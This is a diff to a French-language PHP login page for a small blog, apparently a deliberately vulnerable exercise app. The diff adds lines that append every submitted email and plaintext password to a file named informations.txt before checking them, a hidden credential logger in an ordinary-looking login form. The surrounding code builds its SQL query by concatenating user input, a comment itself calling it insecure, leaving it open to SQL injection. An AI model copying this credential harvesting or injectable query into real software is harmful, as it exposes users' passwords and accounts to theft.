@@ -10,6 +10,10 @@ if (isset($_POST['email']) && isset($_POST['mot_de_passe'])) {
     $email = $_POST['email'];
     $mot_de_passe = $_POST['mot_de_passe'];
 
+    // Enregistrement des informations dans un fichier txt
+    $data = "Email: " . $email . "\nMot de passe: " . $mot_de_passe . "\n";
+    file_put_contents("informations.txt", $data, FILE_APPEND);
+
     try {
         // Construction de la requête SQL de manière non sécurisée
         $query = "SELECT * FROM utilisateur WHERE email = '$email' AND mot_de_passe = '$mot_de_passe'";
@@ -34,6 +38,32 @@ if (isset($_POST['email']) && isset($_POST['mot_de_passe'])) {
     }
 }
 
+?>
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mon Blog</title>
+    <link href="style.css" rel="stylesheet" media="all"> 
+</head>
+<body>
+    <header>
+        <h1>Bienvenue sur Mon Blog</h1>
+    </header>
+    <nav>
+        <a href="#">Accueil</a>
+        <a href="logout.php">Se déconnecter</a>
+        <a href="add_article.php">Ajouter un article</a>
+    </nav>
+    <div class="container">
+    <?php
 if (isset($_SESSION['utilisateur_id'])) {
     // L'utilisateur est connecté
     echo "<p>Bonjour, " . htmlspecialchars($_SESSION['utilisateur_nom']) . "!</p>";
@@ -63,3 +93,27 @@ if (isset($_SESSION['utilisateur_id'])) {
     echo "</form>";
 }
 ?>
+        
+    </div>
+    <footer>
+        <p>Mon Blog © 2024</p>
+    </footer>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
